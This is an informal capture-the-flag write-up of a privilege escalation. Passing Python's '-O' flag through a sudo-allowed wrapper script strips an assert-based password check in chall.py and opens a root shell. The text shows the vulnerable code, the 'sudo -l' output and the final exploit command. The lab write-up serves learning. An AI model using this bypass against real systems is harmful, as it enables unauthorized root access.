After connecting to the challenge we can see that we have 3 files
`chall.py entrypoint.sh ynetd`
we can only read `chall.py`
```py
import os
import sys

x = input("Enter secret: ").strip()
try:
        assert(x == open("/root/password", 'r').read())
except AssertionError:
        print("GET OUT!!!!!!")
        exit()

os.system('/bin/bash')
```

looking at it the only unusual thing that we can see is the use of `assert` which is reaely used so we keep a mintal note of it


See what you can run with `sudo -l`

```sh
sudo -l
Matching Defaults entries for player on e478e8d1a810:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User player may run the following commands on e478e8d1a810:
    (ALL) NOPASSWD: /usr/local/bin/check.sh
```
we can run the command `sudo /usr/local/bin/check.sh` without the root password

read the `/usr/local/bin/check.sh` 

```sh
cat /usr/local/bin/check.sh
#!/bin/bash

ALLOWED="^[-A-Za-z0-9]{0,3}$"

if [[ $# == 2 && "$1" == "/usr/local/bin/python3" && "$2" == "/home/player/chall.py" ]]; then
  exec "$@"
elif [[ $# == 3 && "$1" == "/usr/local/bin/python3" && "$2" =~ $ALLOWED && "$3" == "/home/player/chall.py" ]]; then
  exec "$@"
else
  echo "Invalid command"
  exit 1
fi
```
we can sea that we have 2 options for runing the scrip `/home/player/chall.py`
1- running it without any options
`sudo /usr/local/bin/check.sh /usr/local/bin/python3 /home/player/chall.py` 
2- giving it an options that follows the regex `^[-A-Za-z0-9]{0,3}$` 


so i decided to do some googling and found this on [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#misc-python)
it seems that u can skip any assert check with the moption `-O`.

sol:
```sh
sudo /usr/local/bin/check.sh /usr/local/bin/python3 -O /home/player/chall.py
```

read the flag in root


